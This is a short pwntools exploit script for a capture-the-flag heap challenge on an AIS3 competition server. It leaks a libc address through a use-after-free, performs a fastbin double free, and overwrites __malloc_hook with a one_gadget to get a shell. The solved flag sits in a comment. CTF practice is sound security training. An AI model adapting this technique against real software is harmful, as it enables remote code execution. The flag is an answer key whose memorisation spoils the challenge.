from pwn import *

#r = process('./I',env={"LD_PRELOAD" : "./libc-2.23.so"})
r = remote('chals1.ais3.org',50003)
def create(size,content):
    r.sendlineafter(b'> ',b'1')
    r.sendlineafter(b'> ',str(size).encode())
    r.sendafter(b'Describe the dream: ',content)


def read_content(id):
    r.sendlineafter(b'> ',b'2')
    r.sendlineafter(b'> ',str(id).encode())
    r.recvuntil(b':\n')


def delete(id):
    r.sendlineafter(b'> ',b'3')
    r.sendlineafter(b'> ',str(id).encode())


create(3,b'aaaaaaaa') # 1
create(2,b'aaaaaaaa') #2
delete(1)
read_content(1)
leak = u64(r.recv(6)+b'\x00\x00') - 0x3c4b10 - 0x68
print(hex(leak))


create(2,b'aaaaaaaa') # 3
create(2,b'aaaaaaaa') # 4

delete(2)
delete(3)
delete(4)
delete(3)

malloc_hook = leak + 0x3c4b00
one_gadget = leak + 0xf1247
realloc = leak + 0x84712

create(2,p64(malloc_hook +0x5-0x18))
create(2,b'aaaaaaaaaaaaaaaa')
create(2,p64(one_gadget))
create(2,b'\x00' * 3 + p64(one_gadget) * 2 + p64(realloc))
create(2,b'aaa')
# AIS3{Y0u_h4v3_b33n_succ3ssfully_r3cru1t3d_t0_my_t34m}     
r.interactive()